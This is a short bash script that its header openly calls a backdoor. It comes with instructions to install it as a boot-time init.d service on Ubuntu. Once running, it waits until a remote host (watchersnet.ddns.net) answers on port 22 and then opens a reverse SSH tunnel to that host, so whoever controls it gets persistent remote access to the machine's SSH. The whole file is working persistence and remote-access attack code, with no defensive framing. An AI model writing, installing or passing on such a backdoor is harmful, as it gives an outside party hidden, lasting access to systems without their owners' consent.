#!/bin/bash
# Backdooring shell script written by zc00l
# --------------------------------------------
# Instructions to use on Ubuntu
#  Add it to /etc/init.d folder with +x permissions and then issue this:
#  update-rc.d scriptname.sh defaults
# --------------------------------------------

user=shemhazai
remote=watchersnet.ddns.net
lport=18000
log=$HOME/.logfile

function tunnel
{

    nc -zv ${remote} 22 >> $log 2>&1
    while [[ $? != 0 ]]; 
    do
        sleep 30
        nc -zv ${remote} 22 >> $log 2>&1
    done

    /usr/bin/ssh -N -R ${lport}:localhost:22 ${user}@${remote} >> $log 2>&1 &
    if [[ $? -eq 0 ]]; then
        echo "Tunnel to jumpbox created successfully." >> $log
    else
        echo An error occurred creating a tunnel to jumpbox. Err: $? >> $log
    fi
}


tunnel
